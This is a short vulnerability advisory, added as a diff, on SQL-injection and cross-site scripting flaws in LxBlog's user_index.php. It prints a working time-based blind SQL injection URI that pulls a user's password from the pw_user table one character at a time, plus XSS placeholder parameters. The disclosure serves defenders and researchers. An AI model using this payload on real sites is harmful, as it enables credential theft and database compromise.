@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/35071/info
+
+LxBlog is prone to an SQL-injection vulnerability and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+The following example URIs are available:
+
+http://www.example.com/user_index.php?action=tag&job=modify&type=blog k LEFT JOIN pw_user i ON 1=1 WHERE i.uid =1 AND
+if((ASCII(SUBSTRING(password,1,1))>0),sleep(10),1)/*&item_type[]=blog k LEFT JOIN pw_user i ON 1=1 WHERE i.uid =1 AND
+if((ASCII(SUBSTRING(password,1,1))>0),sleep(10),1)/*
+
+http://www.example.com/user_index.php?action=tag&job=modify&type=[XSS]&item_type[]=[XSS] 
